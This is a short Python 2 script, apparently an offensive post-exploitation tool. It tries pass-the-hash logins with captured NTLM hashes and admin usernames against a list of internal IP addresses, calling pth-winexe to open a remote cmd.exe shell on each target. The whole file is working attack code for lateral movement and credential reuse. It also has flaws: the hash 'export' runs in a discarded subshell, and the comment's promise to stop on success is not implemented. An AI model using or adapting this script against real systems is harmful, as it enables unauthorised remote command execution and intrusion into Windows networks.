#!/usr/bin/python

import subprocess
import time

'''
Basic PTH script to loop through a set of IP addresses, the hashes are manually inputted into the 
script from your own enumeration and post exploitaion.
The loop will only run n times depending on the amount of hashes. It also tries every combination
of user and IP per hash.
'''

users = ('admin', 'Administrator', 'Admin')

hashes = (
	"aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee",
	"aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee",
	"aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee",
	)

targets = ("192.168.20.1","192.168.20.2","192.168.20.3")

#cmd = 'C:\\Windows\\System32\\cmd.exe'
cmd = 'cmd.exe'

for hash_ in hashes :
	# Loop through collected hashes
	export = "export SMBHASH=" + hash_
	hash_exported = subprocess.Popen(export, shell=True)
	# Loop through the gathered users and selected IP addresses
	for i in range(0, len(targets)) :
		ip = targets[i]
		# Short pause to try not overwhelm target
		time.sleep(0.5)
		for user in users :
			print 'Testing with hash...'
			print '[+] ' + hash_
			print 'Testing IP [+] ' + ip
			print 'Testing with user [+] ' + user + '\n'
			# PTH command, stops when a succesful connection made. 
			con_cmd = 'pth-winexe -U ' + user + '%' + hash_ + ' //'  + ip + ' ' + cmd
			attempt = subprocess.Popen(con_cmd, shell=True)
			print attempt.communicate()
